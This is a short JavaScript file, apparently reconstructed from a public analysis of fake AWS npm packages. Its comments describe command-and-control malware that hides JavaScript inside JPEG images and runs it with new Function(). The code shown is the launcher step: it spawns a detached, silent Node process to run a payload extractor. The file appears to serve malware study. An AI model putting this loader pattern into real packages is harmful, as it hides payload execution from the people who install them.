// jpeg-stego-c2 — reconstructed from public security analyses
// Source: https://blog.phylum.io/fake-aws-packages-ship-command-and-control-malware-in-jpeg-files/
//
// C2 malware hidden inside JPEG image files. Extracts printable ASCII
// characters from image binary data, and if > 2000 bytes, executes as JS.
//
// Technique: Steganography in JPEG + new Function() eval

const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");

// Launch payload extractor in detached process
var child = spawn(process.execPath, [path.join(__dirname, "loadformat.js")], {
  detached: true,
  stdio: "ignore"
});
child.unref();
